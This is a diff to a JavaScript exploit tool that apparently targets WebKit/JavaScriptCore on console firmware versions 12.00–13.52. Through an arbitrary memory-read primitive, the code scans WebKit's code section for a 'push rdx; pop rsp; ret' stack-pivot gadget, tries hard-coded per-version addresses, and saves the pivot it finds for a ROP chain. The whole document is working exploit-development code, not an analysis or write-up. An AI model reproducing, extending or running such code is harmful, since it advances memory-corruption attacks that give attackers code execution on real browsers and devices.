@@ -21,7 +21,7 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828q";
+const BUILD_ID = "rw-20250828r";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -37,6 +37,15 @@ const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
 /** HW peek @ +0x2411b0 showed 48 ff c6… (not G5) — hunt rdx→rsp nearby */
 const G5_HUNT_CENTER = parseInt(params.get("g5center") || "2411b0", 16);
 const G5_HUNT_RADIUS = parseInt(params.get("g5rad") || "80000", 16);
+/** 13.00 G5 @ +0x2abccaa — G0-G4 moved low on 13.52 but G5 may still be here */
+const G5_HIGH_MIN = parseInt(params.get("g5highmin") || "2aa0000", 16);
+const G5_HIGH_MAX = parseInt(params.get("g5highmax") || "2ad0000", 16);
+const G5_HIGH_CENTER = parseInt(params.get("g5highcenter") || "2abccaa", 16);
+const G5_LEGACY_RVAS = [
+    [0x2abccaa, "13.00"],
+    [0x2abb0ba, "12.50"],
+    [0x2abb03a, "12.00"],
+];
 /** G5 full low scan is opt-in (OOM risk) */
 let scanG5Full = params.get("g5full") === "1";
 let g5Hunt = null;
@@ -94,6 +103,7 @@ let scanQuiet = false;
 let scanRenderPending = 0;
 const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-)/;
 const _scanBytes = new Array(8);
+const _win16 = new Array(16);
 
 function $(id) { return document.getElementById(id); }
 
@@ -581,23 +591,124 @@ function pickBestG5Cand(cands, center) {
 }
 
 function scanG5PatternsAt(p, webkitBase, rva, cands, center) {
-    const w = read8p(p, webkitBase.add32(rva));
-    if (!w) return;
-    const bytes = bytesFromRead8(w);
+    if (!fillWindow16(p, webkitBase, rva, _win16)) return;
     for (let pi = 0; pi < G5_PATTERNS.length; pi++) {
-        const offIn = findPatInQword(bytes, G5_PATTERNS[pi].pat);
-        if (offIn >= 0)
-            g5CandPush(cands, { rva: rva + offIn, kind: G5_PATTERNS[pi].kind }, center);
+        const pat = G5_PATTERNS[pi].pat;
+        for (let start = 0; start <= 16 - pat.length; start++) {
+            if (!matchPatAt(_win16, start, pat)) continue;
+            g5CandPush(cands, { rva: rva + start, kind: G5_PATTERNS[pi].kind }, center);
+        }
     }
-    for (let start = 0; start <= 4; start++) {
-        if (bytes[start + 1] === 0x52 && bytes[start + 2] === 0x5c && bytes[start + 3] === 0xc3
-            && bytes[start] >= 0x40 && bytes[start] <= 0x4f) {
+    for (let start = 0; start <= 12; start++) {
+        if (_win16[start + 1] === 0x52 && _win16[start + 2] === 0x5c && _win16[start + 3] === 0xc3
+            && _win16[start] >= 0x40 && _win16[start] <= 0x4f) {
             g5CandPush(cands, {
                 rva: rva + start,
                 kind: "rex push rdx; pop rsp; ret",
             }, center);
         }
     }
+}
+
+function tryLegacyG5(rva, tag) {
+    if (!ready || !window.p) {
+        mark("G5-SKIP", "need Start + Save bases");
+        return;
+    }
+    const p = window.p;
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    if (!webkitBase) {
+        mark("G5-SKIP", "no webkitBase");
+        return;
+    }
+    mark("G5-TRY", tag + " +0x" + rva.toString(16));
+    const hex = gadgetBytesHex(p, webkitBase, rva, 8);
+    if (hex.indexOf("??") >= 0)
+        mark("G5-READ-FAIL", "+0x" + rva.toString(16) + " unreadable — bad base or unmapped");
+    else
+        mark("G5-HEX", "+0x" + rva.toString(16) + " " + hex);
+    const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
+    if (g5) {
+        mark("GADGET-OK", "G5 " + tag + " +0x" + rva.toString(16) + " " + g5.kind);
+        saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
+        verifyPivotManual();
+    } else {
+        mark("GADGET-BAD", "G5 " + tag + " +0x" + rva.toString(16) + " — not rdx→rsp pivot");
+    }
+}
+
+async function runG5ScanRange(minRva, maxRva, center, label) {
+    if (!ready || !window.p || busy) return null;
+    const p = window.p;
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    if (!webkitBase) {
+        mark("G5-SKIP", "no webkitBase — Save bases first");
+        return null;
+    }
+    g5Hunt = {
+        center: center,
+        minRva: minRva,
+        maxRva: maxRva,
+        cursor: null,
+        cands: [],
+        done: false,
+    };
+    busy = true;
+    scanQuiet = true;
+    setUi();
+    mark("G5-HUNT", label + " +0x" + minRva.toString(16) + "…+0x" + maxRva.toString(16));
+    let huntBest = null;
+    try {
+        let finished = false;
+        while (!finished)
+            finished = await g5HuntChunk(p, webkitBase);
+        if (g5Hunt.cands.length) {
+            logG5Cands(g5Hunt.cands);
+            const best = pickBestG5Cand(g5Hunt.cands, center);
+            if (best) {
+                mark("G5-HUNT-BEST", "+0x" + best.rva.toString(16) + " " + best.kind);
+                saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: best.rva });
+                huntBest = best.rva;
+            }
+        } else {
+            mark("G5-HUNT-MISS", label + " — no rdx→rsp pivot");
+        }
+    } finally {
+        scanQuiet = false;
+        g5Hunt = null;
+        busy = false;
+        renderOut();
+        setUi();
+        if (huntBest != null) verifyPivotManual();
+    }
+    return huntBest;
+}
+
+async function runG5HuntNear() {
+    if (g5Hunt && !g5Hunt.done) {
+        g5Hunt = null;
+        mark("G5-STOP", "hunt cancelled");
+        return;
+    }
+    await runG5ScanRange(
+        Math.max(SCAN_PIVOT_MIN, G5_HUNT_CENTER - G5_HUNT_RADIUS),
+        Math.min(SCAN_LOW_MAX, G5_HUNT_CENTER + G5_HUNT_RADIUS),
+        G5_HUNT_CENTER,
+        "low-near-2411b0");
+}
+
+async function runG5HighScan() {
+    await runG5ScanRange(G5_HIGH_MIN, G5_HIGH_MAX, G5_HIGH_CENTER, "high-13.00-region");
+}
+
+async function runG5FullHunt() {
+    scanG5Full = true;
+    await runG5ScanRange(SCAN_PIVOT_MIN, SCAN_LOW_MAX, G5_HUNT_CENTER, "low-full");
+    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
+    await runG5HighScan();
+    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
+    for (let i = 0; i < G5_LEGACY_RVAS.length; i++)
+        tryLegacyG5(G5_LEGACY_RVAS[i][0], G5_LEGACY_RVAS[i][1]);
 }
 
 async function g5HuntChunk(p, webkitBase) {
@@ -614,64 +725,6 @@ async function g5HuntChunk(p, webkitBase) {
     g5Hunt.cursor = rva;
     scanState("G5 hunt @+0x" + rva.toString(16) + " hits=" + g5Hunt.cands.length);
     return rva >= g5Hunt.maxRva;
-}
-
-async function runG5HuntNear() {
-    if (!ready || !window.p || busy) return;
-    if (g5Hunt && !g5Hunt.done) {
-        g5Hunt = null;
-        mark("G5-STOP", "hunt cancelled");
-        busy = false;
-        setUi();
-        return;
-    }
-    const p = window.p;
-    const { webkitBase } = basesFromSession(loadEffectiveOff());
-    if (!webkitBase) {
-        mark("G5-SKIP", "no webkitBase — Save bases first");
-        return;
-    }
-    g5Hunt = {
-        center: G5_HUNT_CENTER,
-        minRva: Math.max(SCAN_PIVOT_MIN, G5_HUNT_CENTER - G5_HUNT_RADIUS),
-        maxRva: Math.min(SCAN_LOW_MAX, G5_HUNT_CENTER + G5_HUNT_RADIUS),
-        cursor: null,
-        cands: [],
-        done: false,
-    };
-    busy = true;
-    scanQuiet = true;
-    setUi();
-    mark("G5-HUNT", "+0x" + g5Hunt.minRva.toString(16) + "…+0x" + g5Hunt.maxRva.toString(16)
-        + " (center +0x" + G5_HUNT_CENTER.toString(16) + " — NOT 48 ff c6 code)");
-    let huntBest = null;
-    try {
-        let finished = false;
-        while (!finished) {
-            finished = await g5HuntChunk(p, webkitBase);
-        }
-        g5Hunt.done = true;
-        if (!g5Hunt.cands.length) {
-            mark("G5-HUNT-MISS", "no rdx→rsp pivot ±0x" + G5_HUNT_RADIUS.toString(16)
-                + " around +0x" + G5_HUNT_CENTER.toString(16));
-            mark("G5-HINT", "tap G5 full scan — 2411b0 is inc rsi, not a gadget");
-        } else {
-            logG5Cands(g5Hunt.cands);
-            const best = pickBestG5Cand(g5Hunt.cands, G5_HUNT_CENTER);
-            if (best) {
-                mark("G5-HUNT-BEST", "+0x" + best.rva.toString(16) + " " + best.kind);
-                saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: best.rva });
-                huntBest = best.rva;
-            }
-        }
-    } finally {
-        scanQuiet = false;
-        g5Hunt = null;
-        busy = false;
-        renderOut();
-        setUi();
-        if (huntBest != null) verifyPivotManual();
-    }
 }
 
 function peekG5Rva(rva) {
@@ -706,10 +759,12 @@ function wireG5Bar() {
         return b;
     }
 
-    addBtn("G5 hunt ±512K", function () { runG5HuntNear(); });
-    addBtn("peek +0x2411b0", function () { peekG5Rva(G5_HUNT_CENTER); });
-    addBtn("G5 probe", function () { runG5ClusterProbe(); });
-    addBtn("G5 full scan", function () {
+    addBtn("G5 hunt low", function () { runG5HuntNear(); });
+    addBtn("G5 high scan", function () { runG5HighScan(); });
+    addBtn("G5 all-in", function () { runG5FullHunt(); });
+    addBtn("Try G5 13.00", function () { tryLegacyG5(0x2abccaa, "13.00"); });
+    addBtn("peek 2abccaa", function () { peekG5Rva(0x2abccaa); });
+    addBtn("G5 probe", function () {
         scanG5Full = true;
         runG5ClusterProbe();
     });
@@ -735,7 +790,7 @@ function wireG5Bar() {
 
     const hint = host.querySelector(".bar-label");
     if (hint) {
-        hint.textContent = "+0x2411b0 = inc rsi (NOT G5) — hunt scans ±512K for 52 5c c3 / mov rsp,rdx";
+        hint.textContent = "G5: low scans missed — try G5 high scan or Try G5 13.00 @ +0x2abccaa";
     }
 }
 
@@ -935,6 +990,9 @@ function pivotClusterRange(found) {
 }
 
 function pivotScanRange(key, phase, found) {
+    if (phase === "high") {
+        return { minRva: G5_HIGH_MIN, maxRva: G5_HIGH_MAX };
+    }
     if (phase === "nearg5") {
         const center = G5_HUNT_CENTER || pivotScanHint(key, found, SCAN_LOW_MAX);
         if (center <= 0 || center >= SCAN_LOW_MAX) return null;
@@ -973,17 +1031,28 @@ function pivotScanFoundInit() {
     return found;
 }
 
-function bytesFromRead8Into(w, out) {
+function bytesFromRead8Into(w, out, at) {
+    at = at || 0;
     let v = w.low >>> 0;
     for (let i = 0; i < 4; i++) {
-        out[i] = v & 0xff;
+        out[at + i] = v & 0xff;
         v >>>= 8;
     }
     v = w.hi >>> 0;
     for (let i = 4; i < 8; i++) {
-        out[i] = v & 0xff;
+        out[at + i] = v & 0xff;
         v >>>= 8;
     }
+}
+
+function fillWindow16(p, base, rva, buf) {
+    const w0 = read8p(p, base.add32(rva));
+    if (!w0) return false;
+    bytesFromRead8Into(w0, buf, 0);
+    const w1 = read8p(p, base.add32(rva + 8));
+    if (w1) bytesFromRead8Into(w1, buf, 8);
+    else for (let i = 8; i < 16; i++) buf[i] = 0;
+    return true;
 }
 
 function bytesFromRead8(w) {
@@ -1180,21 +1249,23 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;
 
     while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
-        const w = read8p(p, webkitBase.add32(rva));
-        if (w) {
-            const bytes = bytesFromRead8(w);
-            for (let pi = 0; pi < pats.length; pi++) {
-                const offIn = findPatInQword(bytes, pats[pi]);
-                if (offIn < 0) continue;
-                const cand = rva + offIn;
-                const kind = patKinds ? patKinds[pi] : null;
-                if (label === "G5")
-                    g5CandPush(pivotScan.g5Cands, { rva: cand, kind }, hint);
-                if (pivotScan.bestHit == null) {
-                    pivotScan.bestHit = kind ? { rva: cand, kind } : { rva: cand };
-                } else if (hint > 0
-                    && Math.abs(cand - hint) < Math.abs(pivotScan.bestHit.rva - hint)) {
-                    pivotScan.bestHit = kind ? { rva: cand, kind } : { rva: cand };
+        if (label === "G5") {
+            scanG5PatternsAt(p, webkitBase, rva, pivotScan.g5Cands, hint || G5_HUNT_CENTER);
+            const best = pickBestG5Cand(pivotScan.g5Cands, hint || G5_HUNT_CENTER);
+            if (best) pivotScan.bestHit = best;
+        } else {
+            const w = read8p(p, webkitBase.add32(rva));
+            if (w) {
+                const bytes = bytesFromRead8(w);
+                for (let pi = 0; pi < pats.length; pi++) {
+                    const offIn = findPatInQword(bytes, pats[pi]);
+                    if (offIn < 0) continue;
+                    const cand = rva + offIn;
+                    if (pivotScan.bestHit == null)
+                        pivotScan.bestHit = { rva: cand };
+                    else if (hint > 0
+                        && Math.abs(cand - hint) < Math.abs(pivotScan.bestHit.rva - hint))
+                        pivotScan.bestHit = { rva: cand };
                 }
             }
         }
@@ -1254,16 +1325,27 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     }
 
     if (label === "G5" && pivotScan.phase === "cluster") {
-        if (scanG5Full) {
-            pivotScan.phase = "low";
-            pivotScan.cursor = null;
-            pivotScan.bestHit = null;
-            savePivotScanState(pivotScan);
-            mark("G5-PHASE", "cluster miss — G5 full scan (chunked)");
-            return "continue";
-        }
+        pivotScan.phase = "low";
+        pivotScan.cursor = null;
+        pivotScan.bestHit = null;
+        savePivotScanState(pivotScan);
+        mark("G5-PHASE", "cluster miss — low .text (16-byte scan)");
+        return "continue";
+    }
+
+    if (label === "G5" && pivotScan.phase === "low") {
+        pivotScan.phase = "high";
+        pivotScan.cursor = null;
+        pivotScan.bestHit = null;
+        pivotScan.g5Cands = [];
+        savePivotScanState(pivotScan);
+        mark("G5-PHASE", "low miss — high .text ~+0x2abb… (13.00 G5 region)");
+        return "continue";
+    }
+
+    if (label === "G5" && pivotScan.phase === "high") {
         logG5Cands(pivotScan.g5Cands);
-        mark("SCAN-MISS", "G5 — tap G5 +0x2411ac or G5 full scan");
+        mark("SCAN-MISS", "G5 not found — tap Try 2abccaa or G5 all-in");
         pivotScan.rowIdx++;
         pivotScan.phase = "nearg5";
         pivotScan.bestHit = null;
